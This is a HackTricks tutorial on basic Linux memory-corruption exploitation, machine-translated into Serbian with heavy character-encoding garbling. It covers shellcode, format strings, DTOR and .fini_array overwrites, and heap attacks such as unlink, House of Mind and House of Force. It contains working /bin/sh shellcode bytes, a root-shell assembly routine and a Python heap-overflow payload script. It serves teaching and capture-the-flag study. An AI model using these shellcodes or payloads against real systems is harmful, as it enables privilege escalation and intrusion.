# Linux Exploiting (Osnovno)

<details>

<summary><strong>NauÄite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi naÄini podrÅ¡ke HackTricks-u:

* Ako Å¾elite da vidite **vaÅ¡u kompaniju reklamiranu na HackTricks-u** ili da **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRIJATELJSTVO**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvaniÄni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**Porodicu PEASS**](https://opensea.io/collection/the-peass-family), naÅ¡u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **PridruÅ¾ite se** ğŸ’¬ [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

## **2.SHELLCODE**

Vidi prekide kernela: cat /usr/include/i386-linux-gnu/asm/unistd\_32.h | grep â€œ\_\_NR\_â€

setreuid(0,0); // \_\_NR\_setreuid 70\
execve(â€œ/bin/shâ€, args\[], NULL); // \_\_NR\_execve 11\
exit(0); // \_\_NR\_exit 1

xor eax, eax ; Äistimo eax\
xor ebx, ebx ; ebx = 0 jer nema argumenata za prosleÄ‘ivanje\
mov al, 0x01 ; eax = 1 â€”> \_\_NR\_exit 1\
int 0x80 ; IzvrÅ¡iti syscall

**nasm -f elf assembly.asm** â€”> VraÄ‡a nam .o datoteku\
**ld assembly.o -o shellcodeout** â€”> Daje nam izvrÅ¡nu datoteku formiranu od asemblerskog koda i moÅ¾emo izvuÄ‡i opkodove sa **objdump**\
**objdump -d -Mintel ./shellcodeout** â€”> Da vidimo da je zaista naÅ¡ shellcode i izvuÄemo OpKodove

**Proverite da li shellcode funkcioniÅ¡e**
```
char shellcode[] = â€œ\x31\xc0\x31\xdb\xb0\x01\xcd\x80â€

void main(){
void (*fp) (void);
fp = (void *)shellcode;
fp();
}<span id="mce_marker" data-mce-type="bookmark" data-mce-fragment="1">â€‹</span>
```
Da biste videli da li se sistemski pozivi pravilno izvrÅ¡avaju, treba da kompajlirate prethodni program i sistemski pozivi treba da se pojave u **strace ./KOMPILIRANI_PROGRAM**

Prilikom kreiranja shellcode-a moÅ¾ete koristiti trik. Prva instrukcija je skok na poziv. Poziv poziva originalni kod i dodaje EIP na stek. Nakon poziva smo ubacili string koji nam je potreban, tako da sa tim EIP-om moÅ¾emo pokazati na string i nastaviti izvrÅ¡avanje koda.

PRIMER **TRICK (/bin/sh)**:
```
jmp                 0x1f                                        ; Salto al Ãºltimo call
popl                %esi                                       ; Guardamos en ese la direcciÃ³n al string
movl               %esi, 0x8(%esi)       ; Concatenar dos veces el string (en este caso /bin/sh)
xorl                 %eax, %eax             ; eax = NULL
movb  %eax, 0x7(%esi)     ; Ponemos un NULL al final del primer /bin/sh
movl               %eax, 0xc(%esi)      ; Ponemos un NULL al final del segundo /bin/sh
movl   $0xb, %eax               ; Syscall 11
movl               %esi, %ebx               ; arg1=â€œ/bin/shâ€
leal                 0x8(%esi), %ecx      ; arg[2] = {â€œ/bin/shâ€, â€œ0â€}
leal                 0xc(%esi), %edx      ; arg3 = NULL
int                    $0x80                         ; excve(â€œ/bin/shâ€, [â€œ/bin/shâ€, NULL], NULL)
xorl                 %ebx, %ebx             ; ebx = NULL
movl   %ebx, %eax
inc                   %eax                          ; Syscall 1
int                    $0x80                         ; exit(0)
call                  -0x24                          ; Salto a la primera instruciÃ³n
.string             \â€/bin/sh\â€                               ; String a usar<span id="mce_marker" data-mce-type="bookmark" data-mce-fragment="1">â€‹</span>
```
**EKSPLOATISANJE koriÅ¡Ä‡enjem Stack-a (/bin/sh):**
```
section .text
global _start
_start:
xor                  eax, eax                     ;Limpieza
mov                al, 0x46                      ; Syscall 70
xor                  ebx, ebx                     ; arg1 = 0
xor                  ecx, ecx                     ; arg2 = 0
int                    0x80                           ; setreuid(0,0)
xor                  eax, eax                     ; eax = 0
push   eax                             ; â€œ\0â€
push               dword 0x68732f2f ; â€œ//shâ€
push               dword 0x6e69622f; â€œ/binâ€
mov                ebx, esp                     ; arg1 = â€œ/bin//sh\0â€
push               eax                             ; Null -> args[1]
push               ebx                             ; â€œ/bin/sh\0â€ -> args[0]
mov                ecx, esp                     ; arg2 = args[]
mov                al, 0x0b                      ; Syscall 11
int                    0x80                           ; excve(â€œ/bin/shâ€, args[â€œ/bin/shâ€, â€œNULLâ€], NULL)
```
**EJ FNSTENV:**
```
fabs
fnstenv [esp-0x0c]
pop eax                     ; Guarda el EIP en el que se ejecutÃ³ fabs
â€¦
```
**Lovac na jaja:**

Ovo je mali kod koji prolazi kroz stranice memorije povezane s procesom u potrazi za shellcode-om koji je tamo spremljen (traÅ¾i neki potpis koji je postavljen u shellcode-u). Korisno u sluÄajevima kada imate samo malo prostora za ubacivanje koda.

**Polimorfni shellkodovi**

To su Å¡ifrovani shellkodovi koji imaju male kodove koji ih deÅ¡ifruju i skoÄe na njih, koristeÄ‡i trik Call-Pop, ovde je **primer Cezarove Å¡ifre**:
```
global _start
_start:
jmp short magic
init:
pop     esi
xor      ecx, ecx
mov    cl,0                              ; Hay que sustituir el 0 por la longitud del shellcode (es lo que recorrerÃ¡)
desc:
sub     byte[esi + ecx -1], 0 ; Hay que sustituir el 0 por la cantidad de bytes a restar (cifrado cesar)
sub     cl, 1
jnz       desc
jmp     short sc
magic:
call init
sc:
;AquÃ­ va el shellcode
```
## **5. Dodatne metode**

**Ret2Ret**

Koristan kada nije moguÄ‡e ubaciti adresu steka u EIP (proverava se da EIP ne sadrÅ¾i 0xbf) ili kada nije moguÄ‡e izraÄunati lokaciju shell koda. MeÄ‘utim, ranjiva funkcija prihvata parametar (ovde Ä‡e iÄ‡i shell kod).

Na ovaj naÄin, menjanjem EIP sa adresom **ret**, uÄitaÄ‡e se sledeÄ‡a adresa (koja je adresa prvog argumenta funkcije). Drugim reÄima, uÄitaÄ‡e se shell kod.

Exploit bi izgledao ovako: SHELLCODE + Punjenje (do EIP) + **\&ret** (naredni bajtovi steka pokazuju na poÄetak shell koda jer se adresa prosleÄ‘enog parametra stavlja na stek)

Izgleda da funkcije poput **strncpy** nakon zavrÅ¡etka briÅ¡u adresu gde je bio smeÅ¡ten shell kod, onemoguÄ‡avajuÄ‡i ovu tehniku. Drugim reÄima, adresa koja se prosleÄ‘uje funkciji kao argument (ona koja Äuva shell kod) se menja u 0x00, pa kada se pozove drugi **ret**, naiÄ‘e se na 0x00 i program se ruÅ¡i.



**Muratova tehnika**

U linuxu, svi programi se mapiraju poÄevÅ¡i od 0xbfffffff

PosmatrajuÄ‡i kako se konstruiÅ¡e stek novog procesa u linuxu, moÅ¾e se razviti exploit tako da program bude pokrenut u okruÅ¾enju gde je jedina promenljiva shell kod. Adresa ove promenljive se moÅ¾e izraÄunati kao: addr = 0xbfffffff - 4 - strlen(NOMBRE\_ejecutable\_completo) - strlen(shellcode)

Na ovaj naÄin, lako se dobija adresa gde se nalazi promenljiva okruÅ¾enja sa shell kodom.

Ovo se moÅ¾e postiÄ‡i zahvaljujuÄ‡i funkciji execle koja omoguÄ‡ava kreiranje okruÅ¾enja koje ima samo Å¾eljene promenljive okruÅ¾enja

**PrekoraÄenja celih brojeva**

Ova vrsta prekoraÄenja se deÅ¡ava kada promenljiva nije spremna da podrÅ¾i tako veliki broj koji joj se prosleÄ‘uje, moÅ¾da zbog zabune izmeÄ‘u promenljivih sa i bez znaka, na primer:
```c
#include <stdion.h>
#include <string.h>
#include <stdlib.h>

int main(int argc, char *argv[]){
int len;
unsigned int l;
char buffer[256];
int i;
len = l = strtoul(argv[1], NULL, 10);
printf("\nL = %u\n", l);
printf("\nLEN = %d\n", len);
if (len >= 256){
printf("\nLongitus excesiva\n");
exit(1);
}
if(strlen(argv[2]) < l)
strcpy(buffer, argv[2]);
else
printf("\nIntento de hack\n");
return 0;
}
```
U prethodnom primeru vidimo da program oÄekuje 2 parametra. Prvi je duÅ¾ina sledeÄ‡eg niza, a drugi je sam niz.

Ako prosledimo negativan broj kao prvi parametar, program Ä‡e prikazati da je len < 256 i proÄ‡i Ä‡e taj filter, a takoÄ‘e Ä‡e strlen(buffer) biti manji od l, jer je l unsigned int i biÄ‡e veoma velik.

Ovaj tip preplavljenja ne pokuÅ¡ava da neÅ¡to upiÅ¡e u proces programa, veÄ‡ da prevaziÄ‘e loÅ¡e dizajnirane filtere kako bi iskoristio druge ranjivosti.

**Nekonfigurisane promenljive**

Nije poznato koji Ä‡e vrednost uzeti nekonfigurisana promenljiva i bilo bi zanimljivo posmatrati je. MoguÄ‡e je da Ä‡e uzeti vrednost koju je imala promenljiva iz prethodne funkcije i da je ova kontrolisana od strane napadaÄa.

##

###

###

###

### **.fini\_array**

Essentially this is a structure with **functions that will be called** before the program finishes. This is interesting if you can call your **shellcode just jumping to an address**, or in cases where you need to go back to main again to **exploit the format string a second time**.
```bash
objdump -s -j .fini_array ./greeting

./greeting:     file format elf32-i386

Contents of section .fini_array:
8049934 a0850408

#Put your address in 0x8049934
```
Napomena da ovo **neÄ‡e** stvoriti **veÄnu petlju** jer kada se vratite u glavni program, kanarinci Ä‡e primetiti, kraj steka moÅ¾e biti oÅ¡teÄ‡en i funkcija viÅ¡e neÄ‡e biti ponovo pozvana. Dakle, s ovim Ä‡ete moÄ‡i **izvrÅ¡iti joÅ¡ 1 put** ranjivost.

### **Formatiranje stringova za ispis sadrÅ¾aja**

Formatni string takoÄ‘e moÅ¾e biti zloupotrebljen da **izbaci sadrÅ¾aj** iz memorije programa. Na primer, u sledeÄ‡oj situaciji postoji **lokalna promenljiva na steku koja pokazuje na zastavu**. Ako **pronaÄ‘ete** gde je u **memoriji** **pokazivaÄ** na **zastavu**, moÅ¾ete naterati **printf da pristupi** toj **adresi** i **ispise** zastavu:

Dakle, zastava je na **0xffffcf4c**

![](<../../.gitbook/assets/image (618) (2).png>)

Iz curenja moÅ¾ete videti da je **pokazivaÄ na zastavu** u **8.** parametru:

![](<../../.gitbook/assets/image (623).png>)

Dakle, **pristupanjem 8. parametru** moÅ¾ete dobiti zastavu:

![](<../../.gitbook/assets/image (624).png>)

Napomena da nakon **prethodnog napada** i shvatanja da moÅ¾ete **procureti sadrÅ¾aj**, moÅ¾ete postaviti pokazivaÄe na **`printf`** na odeljak gde je **izvrÅ¡iv** program i **potpuno ga isprazniti**!

### **DTOR**

{% hint style="danger" %}
Danas je vrlo **Äudno naÄ‡i binarnu datoteku sa odeljkom dtor**.
{% endhint %}

Destruktori su funkcije koje se **izvrÅ¡avaju pre zavrÅ¡etka programa**. Ako uspete **upisati** adresu **shell koda** u **`__DTOR_END__`**, to Ä‡e se **izvrÅ¡iti** pre zavrÅ¡etka programa. Dobijte adresu ovog odeljka sa:
```bash
objdump -s -j .dtors /exec
rabin -s /exec | grep â€œ__DTORâ€
```
ObiÄno Ä‡ete pronaÄ‡i **DTOR** sekciju **izmeÄ‘u** vrednosti `ffffffff` i `00000000`. Dakle, ako vidite samo te vrednosti, to znaÄi da **nema registrovane funkcije**. Dakle, **prepiÅ¡ite** **`00000000`** sa **adresom** **shell koda** da biste ga izvrÅ¡ili.

### **Formatiranje stringova za preplavljivanje bafera**

**Sprintf** pomera formatiran string **u** **promenljivu**. Stoga, moÅ¾ete zloupotrebiti **formatiranje** stringa da izazovete **preplavljivanje bafera u promenljivoj** gde se sadrÅ¾aj kopira.\
Na primer, payload `%.44xAAAA` Ä‡e **upisati 44B+"AAAA" u promenljivu**, Å¡to moÅ¾e izazvati preplavljivanje bafera.

### **\_\_atexit Strukture**

{% hint style="danger" %}
Danas je vrlo **Äudno iskoristiti ovo**.
{% endhint %}

**`Atexit()`** je funkcija kojoj se **prosleÄ‘uju druge funkcije kao parametri.** Ove **funkcije** Ä‡e biti **izvrÅ¡ene** prilikom izvrÅ¡avanja **`exit()`** ili **povratka** iz **main** funkcije.\
Ako moÅ¾ete **modifikovati** **adresu** bilo koje od ovih **funkcija** da pokazuje na shell kod na primer, dobiÄ‡ete **kontrolu** nad **procesom**, ali trenutno je to komplikovanije.\
Trenutno su **adrese funkcija** koje treba izvrÅ¡iti **skrivene** iza nekoliko struktura i na kraju adrese na koje pokazuju nisu adrese funkcija, veÄ‡ su **Å¡ifrovane XOR**-om i pomeraji sa **sluÄajnim kljuÄem**. Tako da je ovaj vektor napada trenutno **nije vrlo koristan bar na x86** i **x64\_86** arhitekturama.\
**Funkcija za Å¡ifrovanje** je **`PTR_MANGLE`**. **Druge arhitekture** poput m68k, mips32, mips64, aarch64, arm, hppa... **ne implementiraju funkciju za Å¡ifrovanje** jer **vraÄ‡aju isto** Å¡to su primile kao ulaz. Dakle, ove arhitekture bi bile podloÅ¾ne ovom vektoru napada.

### **Setjmp() & longjmp()**

{% hint style="danger" %}
Danas je vrlo **Äudno iskoristiti ovo**.
{% endhint %}

**`Setjmp()`** omoguÄ‡ava da se **saÄuva** **kontekst** (registri)\
**`Longjmp()`** omoguÄ‡ava da se **vrati** **kontekst**.\
SaÄuvani registri su: `EBX, ESI, EDI, ESP, EIP, EBP`\
Ono Å¡to se deÅ¡ava je da se EIP i ESP prosleÄ‘uju kroz **`PTR_MANGLE`** funkciju, tako da su **arhitekture podloÅ¾ne ovom napadu iste kao gore**.\
Koriste se za oporavak greÅ¡aka ili prekide.\
MeÄ‘utim, prema onome Å¡to sam proÄitao, ostali registri nisu zaÅ¡tiÄ‡eni, **pa ako postoji `call ebx`, `call esi` ili `call edi`** unutar funkcije koja se poziva, kontrola moÅ¾e biti preuzeta. Ili takoÄ‘e moÅ¾ete modifikovati EBP da biste promenili ESP.

**VTable i VPTR u C++**

Svaka klasa ima **Vtabelu** koja je niz **pokazivaÄa na metode**.

Svaki objekat **klase** ima **VPtr** koji je **pokazivaÄ** na niz svoje klase. VPtr je deo zaglavlja svakog objekta, tako da ako se postigne **prepisivanje** **VPtr-a** moÅ¾e se **modifikovati** da **pokazuje** na laÅ¾nu metodu tako da izvrÅ¡avanje funkcije ode na shell kod.

## **Preventivne mere i izbegavanja**

###

**Zamena Libsafe-a**

Aktivira se sa: LD\_PRELOAD=/lib/libsafe.so.2\
ili\
â€œ/lib/libsave.so.2â€ > /etc/ld.so.preload

Pozivi nekih nesigurnih funkcija se presreÄ‡u sigurnijim. Nije standardizovano. (samo za x86, ne za kompilacije sa -fomit-frame-pointer, ne statiÄke kompilacije, ne sve ranjive funkcije postaju sigurne i LD\_PRELOAD ne radi na binarnim fajlovima sa suid).

**ASCII Armored Address Space**

Sastoji se u uÄitavanju deljenih biblioteka od 0x00000000 do 0x00ffffff kako bi uvek postojao bajt 0x00. MeÄ‘utim, ovo zapravo ne zaustavlja skoro nijedan napad, a posebno ne u little endian formatu.

**Ret2plt**

Sastoji se u izvoÄ‘enju ROP-a tako da se pozove funkcija strcpy@plt (iz plt-a) i usmeri na unos u GOT i kopira prvi bajt funkcije koju Å¾elite pozvati (system()). Zatim se isto radi usmeravajuÄ‡i se na GOT+1 i kopira se 2. bajt system()... Na kraju se poziva saÄuvana adresa u GOT koja Ä‡e biti system()

**Kavezi sa chroot()**

debootstrap -arch=i386 hardy /home/user â€”> Instalira osnovni sistem u odreÄ‘eni poddirektorijum

Administrator moÅ¾e izaÄ‡i iz ovih kaveza tako Å¡to Ä‡e uraditi: mkdir foo; chroot foo; cd ..

**Instrumentacija koda**

Valgrind â€”> TraÅ¾i greÅ¡ke\
Memcheck\
RAD (Return Address Defender)\
Insure++
**shellcode = "\xeb\x0caaaabbbbcccc" #jm 12 + 12 bajtova punjenja**

**shellcode += "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b" \\**

**"\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd" \\**

**"\x80\xe8\xdc\xff\xff\xff/bin/sh";**

**prev\_size = pack("\<Iâ€, 0xfffffff0) #Bit koji oznaÄava da je prethodni komad slobodan treba biti postavljen na 1**

**fake\_size = pack("\<Iâ€, 0xfffffffc) #-4, kako bi se mislilo da je "size" treÄ‡eg komada 4 bajta unazad (ukazuje na prev\_size) jer se tu proverava da li je drugi komad slobodan**

**addr\_sc = pack("\<I", 0x0804a008 + 8) #Na poÄetku payloada dodajemo 8 bajtova punjenja**

**got\_free = pack("\<I", 0x08048300 - 12) #Adresa free() u plt-12 (biÄ‡e prebrisana kako bi se shellcode pokrenula drugi put kada se free pozove)**

**payload = "aaaabbbb" + shellcode + "b"\*(512-len(shellcode)-8) #Kako je reÄeno, payload poÄinje sa 8 bajtova punjenja**

**payload += prev\_size + fake\_size + got\_free + addr\_sc #Modifikuje se drugi komad, got\_free pokazuje gde Ä‡emo saÄuvati adresu addr\_sc + 12**

**os.system("./8.3.o " + payload)**

**unset() oslobaÄ‘anje u obrnutom redosledu (wargame)**

KontroliÅ¡emo 3 uzastopna chunk-a i oslobaÄ‘aju se u obrnutom redosledu od rezervacije.

U tom sluÄaju:

U chunk-u c se stavlja shellcode

Chunk a koristimo da prepiÅ¡emo b tako da size ima deaktiviran bit PREV\_INUSE kako bi mislio da je chunk a slobodan.

TakoÄ‘e, u zaglavlju b se prepiÅ¡e size da bude -4.

Tada Ä‡e program misliti da je "a" slobodan i u binu, pa Ä‡e pozvati unlink() da ga odveÅ¾e. MeÄ‘utim, poÅ¡to je PREV\_SIZE u zaglavlju -4, misliÄ‡e da chunk "a" zapravo poÄinje na b+4. Drugim reÄima, pozvaÄ‡e unlink() na chunk koji poÄinje na b+4, pa Ä‡e u b+12 biti pokazivaÄ "fd", a u b+16 pokazivaÄ "bk".

Na taj naÄin, ako stavimo adresu shellcode u bk i adresu funkcije "puts()" -12 u fd, imamo naÅ¡ payload.

**Tehnika Frontlink**

Poziva se frontlink kada se neÅ¡to oslobodi i nijedan od susednih chunk-ova nije slobodan, umesto pozivanja unlink() direktno se poziva frontlink().

Korisna ranjivost kada malloc koji se napada nikada nije osloboÄ‘en (free()).

Potrebno je:

Buffer koji moÅ¾e biti preplavljen funkcijom unos podataka

Buffer koji je susedan ovom koji treba biti osloboÄ‘en i Äije Ä‡e se polje fd u zaglavlju promeniti zbog prelivanja prethodnog bafera

Buffer koji treba osloboditi sa veliÄinom veÄ‡om od 512 ali manjom od prethodnog bafera

Buffer deklarisan pre koraka 3 koji omoguÄ‡ava prepisivanje prev\_size ovog

Na ovaj naÄin, preplavljujuÄ‡i dva malloc-a na nekontrolisan naÄin i jedan na kontrolisan naÄin koji se oslobaÄ‘a samo jednom, moÅ¾emo napraviti eksploataciju.

**Ranjivost double free()**

Ako se dva puta pozove free() sa istim pokazivaÄem, dva bin-a pokazuju na istu adresu.

U sluÄaju da se Å¾eli ponovo koristiti jedan, to se moÅ¾e uraditi bez problema. U sluÄaju da se Å¾eli koristiti drugi, dodeliÄ‡e mu se isti prostor, pa Ä‡emo imati pokazivaÄe "fd" i "bk" sa laÅ¾nim podacima koje Ä‡e upisati prethodna rezervacija.

**After free()**

Prethodno osloboÄ‘eni pokazivaÄ se ponovo koristi bez kontrole.

## **8 Preplavljenosti hipa: Napredni eksploiti**

Tehnike Unlink() i FrontLink() su uklonjene modifikacijom funkcije unlink().

**The house of mind**

Potrebno je samo jedno pozivanje free() da bi se izazvalo izvrÅ¡avanje proizvoljnog koda. Potrebno je pronaÄ‡i drugi chunk koji moÅ¾e biti preplavljen od strane prethodnog i osloboÄ‘en.

Pozivanje free() dovodi do poziva public\_fREe(mem), Å¡to radi:

mstate ar\_ptr;

mchunkptr p;

â€¦

p = mem2chunk(mes); â€”> VraÄ‡a pokazivaÄ na adresu na kojoj poÄinje chunk (mem-8)

â€¦

ar\_ptr = arena\_for_chunk(p); â€”> chunk\_non\_main\_arena(ptr)?heap\_for\_ptr(ptr)->ar\_ptr:\&main\_arena \[1]

â€¦

\_int\_free(ar\_ptr, mem);

}

U \[1] proverava se polje size bit NON\_MAIN\_ARENA, koje se moÅ¾e promeniti kako bi provera vratila taÄno i izvrÅ¡ila heap\_for\_ptr() koja vrÅ¡i and na "mem" ostavljajuÄ‡i 0 poslednjih 2.5 bajtova (u naÅ¡em sluÄaju od 0x0804a000 ostavlja 0x08000000) i pristupa 0x08000000->ar\_ptr (kao da je struktura heap\_info)

Na ovaj naÄin, ako moÅ¾emo kontrolisati chunk na primer na 0x0804a000 i treba osloboditi chunk na **0x081002a0** moÅ¾emo doÄ‡i do adrese 0x08100000 i upisati Å¡ta god Å¾elimo, na primer **0x0804a000**. Kada se ovaj drugi chunk oslobodi, otkriÄ‡e da heap\_for\_ptr(ptr)->ar\_ptr vraÄ‡a ono Å¡to smo upisali na 0x08100000 (jer se primenjuje and na 0x081002a0 koji smo videli ranije i odatle se izvlaÄi vrednost prvih 4 bajta, ar\_ptr)

Na taj naÄin se poziva \_int\_free(ar\_ptr, mem), odnosno **\_int\_free(0x0804a000, 0x081002a0)**\
**\_int\_free(mstate av, Void\_t\* mem){**\
â€¦\
bck = unsorted\_chunks(av);\
fwd = bck->fd;\
p->bk = bck;\
p->fd = fwd;\
bck->fd = p;\
fwd->bk = p;

..}

Kao Å¡to smo videli ranije, moÅ¾emo kontrolisati vrednost av, jer je to ono Å¡to piÅ¡emo u chunk koji Ä‡e biti osloboÄ‘en.

Kako je definisano unsorted\_chunks, znamo da:\
bck = \&av->bins\[2]-8;\
fwd = bck->fd = \*(av->bins\[2]);\
fwd->bk = \*(av->bins\[2] + 12) = p;

Stoga, ako u av->bins\[2] upiÅ¡emo vrednost \_\_DTOR\_END\_\_-12, u poslednjoj instrukciji Ä‡e biti upisana vrednost u \_\_DTOR\_END\_\_ adresa drugog chunk-a.

Drugim reÄima, u prvom chunk-u na poÄetku treba staviti adresu \_\_DTOR\_END\_\_-12 mnogo puta jer Ä‡e av->bins\[2] to izvuÄ‡i

Na adresi na koju padne adresa drugog chunk-a sa poslednjih 5 nula treba upisati adresu ovog prvog chunk-a kako bi heap\_for\_ptr() mislio da je ar\_ptr na poÄetku prvog chunk-a i izvukao av->bins\[2] odatle

U drugom chunk-u i zahvaljujuÄ‡i prvom, prepisujemo prev\_size sa jump 0x0c i size sa neÄim da aktivira -> NON\_MAIN\_ARENA

Zatim u drugom chunk-u stavljamo gomilu nops i na kraju shellcode

Na taj naÄin Ä‡e se pozvati \_int\_free(CHUNK1, CHUNK2) i pratiti instrukcije za upisivanje u \_\_DTOR\_END\_\_ adresu prev\_size CHUNK2 koji Ä‡e skoÄiti na shellcode.
Da biste primenili ovu tehniku, potrebno je da se ispune odreÄ‘eni zahtevi koji malo komplikuju payload.

Ova tehnika viÅ¡e nije primenjiva jer je gotovo isti zakrpa primenjena kao i za unlink. UporeÄ‘uju se da li novi sajt na koji se pokazuje takoÄ‘e pokazuje na njega.

**Fastbin**

To je varijanta The house of mind

interesuje nas izvrÅ¡avanje sledeÄ‡eg koda do kojeg se dolazi nakon prvog provere u funkciji \_int\_free()

fb = &(av->fastbins\[fastbin\_index(size)] â€”> Gde je fastbin\_index(sz) â€”> (sz >> 3) - 2

â€¦

p->fd = \*fb

\*fb = p

Na ovaj naÄin, ako se postavi u "fb", daje adresu funkcije u GOT-u, na ovu adresu Ä‡e se postaviti adresa prebrisana. Za ovo Ä‡e biti potrebno da je arena blizu adresa dtors. TaÄnije, av->max\_fast treba da bude na adresi koju Ä‡emo prebrisati.

S obzirom da smo sa The House of Mind videli da mi kontroliÅ¡emo poziciju av.

Zato, ako u polje size stavimo veliÄinu 8 + NON\_MAIN\_ARENA + PREV\_INUSE â€”> fastbin\_index() Ä‡e vratiti fastbins\[-1], koji Ä‡e pokazivati na av->max\_fast

U ovom sluÄaju, av->max\_fast Ä‡e biti adresa koja Ä‡e biti prebrisana (ne na koju pokazuje, veÄ‡ ta pozicija Ä‡e biti prebrisana).

TakoÄ‘e, mora se ispuniti uslov da susedni deo osloboÄ‘enog dela bude veÄ‡i od 8 -> PoÅ¡to smo rekli da je veliÄina osloboÄ‘enog dela 8, u ovom laÅ¾nom delu samo treba staviti veliÄinu veÄ‡u od 8 (kako Ä‡e shellcode biti u osloboÄ‘enom delu, na poÄetku treba staviti jmp koji Ä‡e pasti na nops).

TakoÄ‘e, isti laÅ¾ni deo mora biti manji od av->system\_mem. av->system\_mem je udaljen 1848 bajtova.

Zbog nula u \_DTOR\_END\_ i malog broja adresa u GOT-u, nijedna adresa iz ovih sekcija nije pogodna za prebrisivanje, pa pogledajmo kako primeniti fastbin za napad na stek.

JoÅ¡ jedan naÄin napada je preusmeravanje **av** ka steku.

Ako promenimo veliÄinu da bude 16 umesto 8, tada: fastbin\_index() Ä‡e vratiti fastbins\[0] i moÅ¾emo iskoristiti ovo da prepiÅ¡emo stek.

Za ovo ne sme biti nikakvih canary vrednosti ili Äudnih vrednosti na steku, zapravo moramo biti u ovom sluÄaju: 4 bajta nula + EBP + RET

Potrebno je da **av** bude na ovoj adresi i prvi element **av** je mutex koji mora biti 0.

**av->max\_fast** Ä‡e biti EBP i biÄ‡e vrednost koja Ä‡e nam omoguÄ‡iti da preskoÄimo ograniÄenja.

U **av->fastbins\[0]** Ä‡e se prebrisati sa adresom **p** i biÄ‡e RET, tako da Ä‡e se preskoÄiti do shellcode.

TakoÄ‘e, u **av->system\_mem** (1484 bajta iznad pozicije na steku) Ä‡e biti dovoljno smeÄ‡a koje Ä‡e nam omoguÄ‡iti da preskoÄimo proveru koja se vrÅ¡i.

TakoÄ‘e, mora se ispuniti uslov da susedni deo osloboÄ‘enog dela bude veÄ‡i od 8 -> PoÅ¡to smo rekli da je veliÄina osloboÄ‘enog dela 16, u ovom laÅ¾nom delu samo treba staviti veliÄinu veÄ‡u od 8 (kako Ä‡e shellcode biti u osloboÄ‘enom delu, na poÄetku treba staviti jmp koji Ä‡e pasti na nops koji idu posle polja size novog laÅ¾nog dela).

**The House of Spirit**

U ovom sluÄaju traÅ¾imo da imamo pokazivaÄ na malloc koji moÅ¾e biti promenljiv od strane napadaÄa (na primer, da pokazivaÄ bude na steku ispod moguÄ‡eg prelivanja promenljive).

Na taj naÄin, mogli bismo da navedemo ovaj pokazivaÄ da pokazuje gde god Å¾elimo. MeÄ‘utim, ne svako mesto je validno, veliÄina laÅ¾nog dela mora biti manja od av->max\_fast i taÄnije jednaka veliÄini koja Ä‡e biti traÅ¾ena u buduÄ‡em pozivu malloc()+8. Zbog toga, ako znamo da se nakon ovog ranjivog pokazivaÄa poziva malloc(40), veliÄina laÅ¾nog dela mora biti jednaka 48.

Na primer, ako program pita korisnika za broj, mogli bismo uneti 48 i usmeriti promenljivi pokazivaÄ malloc-a na sledeÄ‡ih 4 bajta (koji bi mogli pripadati EBP-u sa sreÄ‡om, tako da 48 ostaje iza, kao da je veliÄina zaglavlja). TakoÄ‘e, adresa ptr-4+48 mora zadovoljiti nekoliko uslova (u ovom sluÄaju ptr=EBP), tj. 8 < ptr-4+48 < av->system\_mem.

U sluÄaju da se ovo ispuni, kada se pozove sledeÄ‡i malloc koji smo rekli da je malloc(40), kao adresi Ä‡e biti dodeljena adresa EBP-a. U sluÄaju da napadaÄ takoÄ‘e moÅ¾e kontrolisati Å¡ta se piÅ¡e u ovom malloc-u, moÅ¾e prebrisati kako EBP tako i EIP sa adresom koju Å¾eli.

Mislim da je to zato Å¡to kada se oslobodi free() ÄuvaÄ‡e se da u adresi koja pokazuje na EBP steka postoji deo taÄne veliÄine za novi malloc() koji se Å¾eli rezervisati, pa Ä‡e mu biti dodeljena ta adresa.

**The House of Force**

Potrebno je:

* Preplavljivanje dela koje omoguÄ‡ava prebrisivanje wilderness-a
* Poziv malloc() sa veliÄinom definisanom od strane korisnika
* Poziv malloc() Äiji podaci mogu biti definisani od strane korisnika

Prvo Å¡to se radi je prebrisivanje veliÄine dela wilderness sa veoma velikom vrednoÅ¡Ä‡u (0xffffffff), tako da Ä‡e svaki zahtev za memorijom dovoljno velik biti obraÄ‘en u \_int\_malloc() bez potrebe za proÅ¡irivanjem hipa.

Drugo je promena av->top tako da pokazuje na deo memorije pod kontrolom napadaÄa, kao Å¡to je stek. U av->top Ä‡e se postaviti \&EIP - 8.

Mora se prebrisati av->top tako da pokazuje na deo memorije pod kontrolom napadaÄa:

victim = av->top;

remainder = chunck\_at\_offset(victim, nb);

av->top = remainder;

Victim prikuplja vrednost adrese trenutnog dela wilderness-a (trenutni av->top) i remainder je taÄno suma te adrese plus koliÄina bajtova traÅ¾ena od strane malloc(). Dakle, ako je \&EIP-8 na 0xbffff224 i av->top sadrÅ¾i 0x080c2788, tada Ä‡e koliÄina koju moramo rezervisati u kontrolisanom malloc-u da bi av->top pokazivao na $EIP-8 za sledeÄ‡i malloc() biti:

0xbffff224 - 0x080c2788 = 3086207644.

Na taj naÄin Ä‡e se saÄuvati promenjena vrednost u av->top i sledeÄ‡i malloc Ä‡e pokazivati na EIP i moÄ‡i Ä‡e ga prebrisati.

VaÅ¾no je znati da veliÄina novog dela wilderness bude veÄ‡a od zahteva poslednjeg malloc(). Drugim reÄima, ako wilderness pokazuje na \&EIP-8, veliÄina Ä‡e biti taÄno u polju EBP steka.

**The House of Lore**

**Korupcija SmallBin**

